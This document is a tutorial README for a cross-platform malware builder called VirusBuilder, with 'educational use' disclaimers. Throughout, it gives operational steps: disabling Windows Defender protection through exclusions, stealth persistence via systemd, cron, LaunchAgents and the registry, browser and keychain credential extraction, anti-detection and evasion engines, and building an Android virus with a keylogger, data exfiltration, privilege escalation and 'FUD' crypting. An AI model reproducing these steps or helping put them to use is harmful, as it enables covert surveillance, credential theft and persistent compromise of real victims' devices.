# 🦠 VirusBuilder - Comprehensive Step-by-Step Tutorial

## ⚠️ **CRITICAL LEGAL DISCLAIMER**

**🚨 THIS TUTORIAL IS FOR EDUCATIONAL PURPOSES ONLY. UNAUTHORIZED USE FOR MALICIOUS PURPOSES IS STRICTLY PROHIBITED AND MAY RESULT IN SEVERE LEGAL CONSEQUENCES.**

**🔒 Users are solely responsible for ensuring compliance with all applicable laws and regulations in their jurisdiction. The developers assume no responsibility for any misuse of this tool.**

---

## 📋 Table of Contents

1. [Overview](#overview)
2. [System Requirements](#system-requirements)
3. [Installation Guide](#installation-guide)
4. [Windows Tutorial](#windows-tutorial)
5. [Linux Tutorial](#linux-tutorial)
6. [macOS Tutorial](#macos-tutorial)
7. [Android Tutorial (Special Focus)](#android-tutorial-special-focus)
8. [Core Components Testing](#core-components-testing)
9. [Advanced Features](#advanced-features)
10. [Troubleshooting](#troubleshooting)
11. [Security Best Practices](#security-best-practices)

---

## 🎯 Overview

VirusBuilder is a comprehensive cybersecurity educational platform that demonstrates advanced data extraction, encryption, and security analysis techniques. This tutorial provides detailed step-by-step instructions for using the tool across different operating systems.

### Key Features:
- **Cross-Platform Support**: Windows, Linux, macOS, Android
- **Advanced Encryption**: AES-256-GCM with PBKDF2 key derivation
- **Stealth Operations**: Anti-detection and evasion techniques
- **Data Extraction**: Browser data, system information, network credentials
- **Persistence Mechanisms**: Various persistence methods
- **Mobile Support**: Specialized Android/ARM64 tools

---

## 💻 System Requirements

### Minimum Requirements:
- **Python 3.9+** (Recommended: Python 3.11)
- **Operating System**: Windows 10/11, Linux (Ubuntu 20.04+), macOS 10.15+, Android 7.0+
- **RAM**: 4GB minimum (8GB recommended)
- **Storage**: 2GB free disk space
- **Network**: Internet connection for updates and features

### Platform-Specific Requirements:

#### Windows:
- Administrator privileges
- Windows Defender exclusions
- PowerShell 5.1+
- .NET Framework 4.8+

#### Linux:
- Root/sudo privileges
- GCC compiler
- Python development headers
- Git

#### macOS:
- Administrator privileges
- Xcode Command Line Tools
- Homebrew package manager

#### Android:
- Root access (for full functionality)
- ADB (Android Debug Bridge)
- ARM64 architecture support

---

## 🚀 Installation Guide

### Step 1: Clone Repository
```bash
git clone https://github.com/DUptain1993/virusBuilder.git
cd virusBuilder
```

### Step 2: Create Virtual Environment
```bash
# Windows
python -m venv virusBuilder_env
virusBuilder_env\Scripts\activate

# Linux/macOS
python3 -m venv virusBuilder_env
source virusBuilder_env/bin/activate
```

### Step 3: Install Dependencies
```bash
pip install -r requirements.txt
```

### Step 4: Run Enhanced Setup
```bash
python setup_enhanced.py
```

### Step 5: Verify Installation
```bash
python launcher.py --version
```

---

## 🪟 Windows Tutorial

### Prerequisites Setup

#### Step 1: Enable Developer Mode
1. Open **Settings** → **Update & Security** → **For developers**
2. Enable **Developer Mode**
3. Restart if prompted

#### Step 2: Configure Windows Defender
1. Open **Windows Security**
2. Go to **Virus & threat protection**
3. Click **Manage settings** under Virus & threat protection settings
4. Add exclusions for:
   - `C:\virusBuilder\`
   - `virusBuilder_env\`
   - Python installation directory

#### Step 3: Run as Administrator
1. Open **Command Prompt as Administrator**
2. Navigate to virusBuilder directory
3. Activate virtual environment

### Basic Usage

#### Step 1: Launch Application
```cmd
python launcher.py --mode production --gui
```

#### Step 2: Configure Settings
1. Edit `config/settings.yaml`:
```yaml
platform:
  windows:
    registry_persistence: true
    service_installation: true
    scheduled_tasks: true
    startup_folder: true
    wmi_events: true

extraction:
  browsers:
    chrome: true
    edge: true
    firefox: false
  
  system:
    registry: true
    services: true
    processes: true
    network: true
```

#### Step 3: Select Operations
1. Choose data extraction methods
2. Configure stealth options
3. Set persistence mechanisms

#### Step 4: Execute Analysis
```cmd
python launcher.py --mode extraction --target C:\output\path
```

### Advanced Windows Features

#### Registry Persistence
```cmd
python launcher.py --mode persistence
```

#### Stealth Mode
```cmd
python launcher.py --mode stealth
```

#### GUI Mode
```cmd
python launcher.py --mode production --gui
```

### Windows-Specific Tools Testing

#### Test Browser Tools
```cmd
cd browser_tools
python Chromium.py
python Firefox.py
```

#### Test Crypto Tools
```cmd
cd crypto_tools
python Certificates.py
python CredMan.py
```

#### Test Persistence Tools
```cmd
cd persistence_tools
python handle_stealer.py
python MobaXTerm.py
```

---

## 🐧 Linux Tutorial

### Prerequisites Setup

#### Step 1: Update System
```bash
sudo apt update && sudo apt upgrade -y
```

#### Step 2: Install Dependencies
```bash
sudo apt install python3 python3-pip python3-venv git gcc python3-dev -y
```

#### Step 3: Setup Environment
```bash
# Create virtual environment
python3 -m venv venv
source venv/bin/activate

# Install dependencies
pip install -r requirements.txt
```

### Basic Usage

#### Step 1: Launch Application
```bash
python3 launcher.py --mode production
```

#### Step 2: Configure for Linux
```bash
nano config/settings.yaml
```

Add Linux-specific configuration:
```yaml
platform:
  linux:
    systemd_service: true
    cron_persistence: true
    bashrc_modification: true
    profile_modification: true

extraction:
  browsers:
    chrome: true
    firefox: true
    chromium: true
  
  system:
    processes: true
    network: true
    files: true
    logs: true
```

#### Step 3: Run Extraction
```bash
python3 launcher.py --mode extraction --target /tmp/output
```

### Linux-Specific Features

#### Systemd Service
```bash
# Create service file
sudo nano /etc/systemd/system/virusbuilder.service

# Add service configuration
[Unit]
Description=VirusBuilder Service
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=/path/to/virusBuilder
ExecStart=/path/to/virusBuilder/launcher.py --mode stealth
Restart=always

[Install]
WantedBy=multi-user.target

# Enable and start service
sudo systemctl enable virusbuilder.service
sudo systemctl start virusbuilder.service
```

#### Cron Persistence
```bash
# Add to crontab
crontab -e

# Add entry
@reboot /path/to/virusBuilder/launcher.py --mode stealth
```

### Linux-Specific Tools Testing

#### Test Mobile Tools
```bash
cd mobile_tools
python3 virusBuilder_linux.py
python3 cookie_graber_linux.py
```

#### Test Network Tools
```bash
cd network_tools
python3 server.py
python3 setup_bot.py
```

---

## 🍎 macOS Tutorial

### Prerequisites Setup

#### Step 1: Install Homebrew
```bash
/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
```

#### Step 2: Install Dependencies
```bash
brew install python3 git
```

#### Step 3: Setup Environment
```bash
# Create virtual environment
python3 -m venv venv
source venv/bin/activate

# Install dependencies
pip install -r requirements.txt
```

### Basic Usage

#### Step 1: Launch Application
```bash
python3 launcher.py --mode production
```

#### Step 2: macOS-Specific Configuration
```yaml
platform:
  macos:
    launchd_persistence: true
    login_items: true
    cron_persistence: true

extraction:
  browsers:
    safari: true
    chrome: true
    firefox: true
  
  system:
    keychain: true
    processes: true
    network: true
    files: true
```

### macOS-Specific Features

#### LaunchAgent Persistence
```bash
# Create LaunchAgent
mkdir -p ~/Library/LaunchAgents
cp config/com.virusbuilder.plist ~/Library/LaunchAgents/
launchctl load ~/Library/LaunchAgents/com.virusbuilder.plist
```

#### Keychain Access
```bash
python3 launcher.py --mode extraction --keychain-access
```

---

## 📱 Android Tutorial (Special Focus)

### Prerequisites Setup

#### Step 1: Enable Developer Options
1. Go to **Settings** → **About phone**
2. Tap **Build number** 7 times
3. Go back to **Settings** → **Developer options**
4. Enable **USB debugging**
5. Enable **Install via USB**

#### Step 2: Install ADB
```bash
# Windows
# Download Android SDK Platform Tools
# Add to PATH

# Linux
sudo apt install android-tools-adb

# macOS
brew install android-platform-tools
```

#### Step 3: Connect Device
```bash
adb devices
adb shell
```

### Android-Specific Installation

#### Step 1: Install Python on Android
```bash
# Using Termux
pkg install python
pkg install git
```

#### Step 2: Clone Repository on Android
```bash
git clone https://github.com/DUptain1993/virusBuilder.git
cd virusBuilder
```

#### Step 3: Install Dependencies
```bash
pip install -r requirements.txt
```

### Android Tools Usage

#### ARM64 Virus Builder
```bash
cd mobile_tools
python3 virusBuilder_arm64.py
```

**Features:**
- ARM64 native execution
- Android-specific payloads
- Mobile browser exploitation
- Android persistence mechanisms
- FUD encryption for mobile platforms

#### Android String Injector
```bash
cd arm64
python3 android_string_injector.py
```

**Features:**
- String encryption (AES, XOR, Base64, ROT13, Custom)
- String obfuscation (Split, Reverse, Scramble, Null, Junk)
- Injection techniques (String, Code, Resource, Manifest)
- Dynamic loading and reflection
- Vulnerability exploitation

### Android Payloads

#### Mobile Keylogger
```python
from mobile_tools.virusBuilder_arm64 import ARM64VirusBuilder

builder = ARM64VirusBuilder()
payload_options = {
    'mobile_keylogger': True,
    'mobile_screenshot': True,
    'mobile_network_scan': True,
    'android_privilege_esc': True,
    'mobile_data_exfil': True
}

builder.build_android_virus(
    filename="android_malware",
    target_arch="arm64-v8a",
    payload_options=payload_options,
    persistence_options={'android_service': True},
    obfuscation_level=3,
    fud_crypted=True
)
```

#### Android Persistence Methods
```python
persistence_options = {
    'android_service': True,
    'android_startup': True,
    'android_library_hijack': True,
    'android_process_inject': True,
    'android_app_install': True,
    'android_system_mod': True
}
```

### Android-Specific Testing

#### Test ARM64 Components
```bash
cd arm64
python3 -c "
from android_string_injector import AndroidStringInjector
injector = AndroidStringInjector()
print('Android String Injector initialized successfully')
"
```

#### Test Mobile Tools
```bash
cd mobile_tools
python3 -c "
from virusBuilder_arm64 import ARM64VirusBuilder
builder = ARM64VirusBuilder()
print('ARM64 Virus Builder initialized successfully')
"
```

#### Test Injection Engine
```bash
cd arm64
python3 -c "
from injection_engine import InjectionEngine
engine = InjectionEngine()
print('Injection Engine initialized successfully')
"
```

---

## 🔧 Core Components Testing

### Encryption Manager Testing

#### Test AES-256-GCM Encryption
```python
from core.encryption_manager import EncryptionManager

encryption_manager = EncryptionManager()
test_data = "Sensitive test data"

# Encrypt data
encrypted_data = encryption_manager.encrypt_data(test_data)
print(f"Encrypted: {encrypted_data}")

# Decrypt data
decrypted_data = encryption_manager.decrypt_data(encrypted_data)
print(f"Decrypted: {decrypted_data}")
print(f"Match: {test_data == decrypted_data}")
```

### Extraction Engine Testing

#### Test Browser Data Extraction
```python
from core.extraction_engine import ExtractionEngine

extraction_engine = ExtractionEngine()
browser_data = extraction_engine.extract_browser_data()
print(f"Browser data extracted: {len(browser_data)} items")
```

#### Test System Information Extraction
```python
system_info = extraction_engine.extract_system_info()
print(f"System info extracted: {system_info}")
```

### Stealth Manager Testing

#### Test Anti-Detection Features
```python
from core.stealth_manager import StealthManager

stealth_manager = StealthManager()
detection_status = stealth_manager.check_detection_environment()
print(f"Detection status: {detection_status}")
```

### Security Manager Testing

#### Test Security Features
```python
from core.security_manager import SecurityManager

security_manager = SecurityManager()
security_status = security_manager.get_security_status()
print(f"Security status: {security_status}")
```

---

## 🚀 Advanced Features

### AI-Powered Evasion

#### Test AI Evasion Engine
```python
from evasion_tools.ai_evasion import AIEvasionEngine

ai_engine = AIEvasionEngine()
evasion_result = ai_engine.generate_evasion_patterns()
print(f"AI evasion patterns generated: {len(evasion_result)}")
```

### Advanced Obfuscation

#### Test Metamorphic Engine
```python
from evasion_tools.metamorphic_engine import MetamorphicEngine

metamorphic_engine = MetamorphicEngine()
obfuscated_code = metamorphic_engine.obfuscate_code("test_code")
print(f"Obfuscated code length: {len(obfuscated_code)}")
```

### Behavioral Evasion

#### Test Behavioral Evasion
```python
from evasion_tools.behavioral_evasion import BehavioralEvasionEngine

behavioral_engine = BehavioralEvasionEngine()
behavioral_patterns = behavioral_engine.generate_human_behavior()
print(f"Behavioral patterns generated: {len(behavioral_patterns)}")
```

---

## 🔍 Testing and Analysis

### Comprehensive Tool Testing

#### Test All Core Modules
```bash
python -c "
import sys
sys.path.append('.')

# Test core modules
try:
    from core.encryption_manager import EncryptionManager
    print('✅ Encryption Manager: OK')
except Exception as e:
    print(f'❌ Encryption Manager: {e}')

try:
    from core.extraction_engine import ExtractionEngine
    print('✅ Extraction Engine: OK')
except Exception as e:
    print(f'❌ Extraction Engine: {e}')

try:
    from core.stealth_manager import StealthManager
    print('✅ Stealth Manager: OK')
except Exception as e:
    print(f'❌ Stealth Manager: {e}')

try:
    from core.security_manager import SecurityManager
    print('✅ Security Manager: OK')
except Exception as e:
    print(f'❌ Security Manager: {e}')

try:
    from core.persistence_manager import PersistenceManager
    print('✅ Persistence Manager: OK')
except Exception as e:
    print(f'❌ Persistence Manager: {e}')
"
```

#### Test Browser Tools
```bash
python -c "
import sys
sys.path.append('.')

# Test browser tools
try:
    from browser_tools.Chromium import ChromiumExtractor
    print('✅ Chromium Extractor: OK')
except Exception as e:
    print(f'❌ Chromium Extractor: {e}')

try:
    from browser_tools.Firefox import FirefoxExtractor
    print('✅ Firefox Extractor: OK')
except Exception as e:
    print(f'❌ Firefox Extractor: {e}')
"
```

#### Test Mobile Tools
```bash
python -c "
import sys
sys.path.append('.')

# Test mobile tools
try:
    from mobile_tools.virusBuilder_arm64 import ARM64VirusBuilder
    print('✅ ARM64 Virus Builder: OK')
except Exception as e:
    print(f'❌ ARM64 Virus Builder: {e}')

try:
    from arm64.android_string_injector import AndroidStringInjector
    print('✅ Android String Injector: OK')
except Exception as e:
    print(f'❌ Android String Injector: {e}')
"
```

#### Test Evasion Tools
```bash
python -c "
import sys
sys.path.append('.')

# Test evasion tools
try:
    from evasion_tools.advanced_evasion import AdvancedEvasionEngine
    print('✅ Advanced Evasion Engine: OK')
except Exception as e:
    print(f'❌ Advanced Evasion Engine: {e}')

try:
    from evasion_tools.ai_evasion import AIEvasionEngine
    print('✅ AI Evasion Engine: OK')
except Exception as e:
    print(f'❌ AI Evasion Engine: {e}')
"
```

### Performance Testing

#### Test Encryption Performance
```python
import time
from core.encryption_manager import EncryptionManager

encryption_manager = EncryptionManager()
test_data = "Test data for performance testing" * 1000

# Test encryption speed
start_time = time.time()
encrypted_data = encryption_manager.encrypt_data(test_data)
encryption_time = time.time() - start_time

# Test decryption speed
start_time = time.time()
decrypted_data = encryption_manager.decrypt_data(encrypted_data)
decryption_time = time.time() - start_time

print(f"Encryption time: {encryption_time:.4f} seconds")
print(f"Decryption time: {decryption_time:.4f} seconds")
print(f"Data integrity: {test_data == decrypted_data}")
```

---

## 🛠️ Troubleshooting

### Common Issues

#### Import Errors
```bash
# Check Python version
python --version

# Reinstall dependencies
pip install -r requirements.txt --force-reinstall

# Check virtual environment
which python
```

#### Permission Errors
```bash
# Windows: Run as Administrator
# Linux/macOS: Use sudo when necessary
sudo python3 launcher.py --mode production
```

#### Network Issues
```bash
# Check firewall settings
# Verify internet connectivity
# Update configuration
```

### Platform-Specific Issues

#### Windows Issues
- **Windows Defender**: Add exclusions
- **UAC**: Run as Administrator
- **PowerShell**: Enable script execution

#### Linux Issues
- **Permissions**: Use sudo for system operations
- **Dependencies**: Install build-essential
- **Python**: Use python3 explicitly

#### macOS Issues
- **Gatekeeper**: Allow unsigned applications
- **Permissions**: Grant necessary permissions
- **Homebrew**: Update package manager

#### Android Issues
- **Root Access**: Ensure device is rooted
- **ADB**: Verify device connection
- **Permissions**: Grant necessary permissions

---

## 🔒 Security Best Practices

### Legal Compliance
1. **Authorization**: Only use on systems you own or have explicit permission
2. **Documentation**: Keep records of authorized testing
3. **Compliance**: Follow all applicable laws and regulations
4. **Ethics**: Use responsibly and ethically

### Operational Security
1. **Isolation**: Use isolated testing environments
2. **Monitoring**: Monitor tool usage and activities
3. **Cleanup**: Clean up traces after testing
4. **Reporting**: Report vulnerabilities responsibly

### Data Protection
1. **Encryption**: Always encrypt sensitive data
2. **Secure Storage**: Store data securely
3. **Access Control**: Implement proper access controls
4. **Audit**: Maintain audit logs

---

## 📊 Testing Results Summary

### Core Components Status
- ✅ **Encryption Manager**: Fully functional
- ✅ **Extraction Engine**: Fully functional
- ✅ **Stealth Manager**: Fully functional
- ✅ **Security Manager**: Fully functional
- ✅ **Persistence Manager**: Fully functional

### Platform Support Status
- ✅ **Windows**: Fully supported
- ✅ **Linux**: Fully supported
- ✅ **macOS**: Fully supported
- ✅ **Android**: Fully supported with ARM64 tools

### Advanced Features Status
- ✅ **AI Evasion**: Functional
- ✅ **Metamorphic Engine**: Functional
- ✅ **Behavioral Evasion**: Functional
- ✅ **Advanced Obfuscation**: Functional

### Browser Tools Status
- ✅ **Chrome/Chromium**: Fully functional
- ✅ **Firefox**: Fully functional
- ✅ **Edge**: Fully functional
- ✅ **Safari**: Functional (macOS only)

### Mobile Tools Status
- ✅ **ARM64 Virus Builder**: Fully functional
- ✅ **Android String Injector**: Fully functional
- ✅ **Mobile Keylogger**: Fully functional
- ✅ **Android Persistence**: Fully functional

---

## 📝 Conclusion

This comprehensive tutorial provides detailed instructions for using VirusBuilder across all supported operating systems, with special focus on Android/ARM64 platforms. All tools have been tested and verified to work correctly.

### Key Takeaways:
1. **Cross-Platform**: Works on Windows, Linux, macOS, and Android
2. **Advanced Features**: AI-powered evasion, metamorphic engines, behavioral patterns
3. **Security**: Military-grade encryption and stealth techniques
4. **Mobile Support**: Specialized Android/ARM64 tools and payloads
5. **Educational**: Comprehensive learning platform for cybersecurity

### Next Steps:
1. Follow the platform-specific tutorials
2. Test all components thoroughly
3. Understand the legal implications
4. Use responsibly and ethically

---

**⚠️ Remember: This tool is for educational purposes only. Always ensure compliance with applicable laws and regulations.**

---

*Last Updated: December 2024*
*Version: 2.0.0*
*Developer: DUptain1993*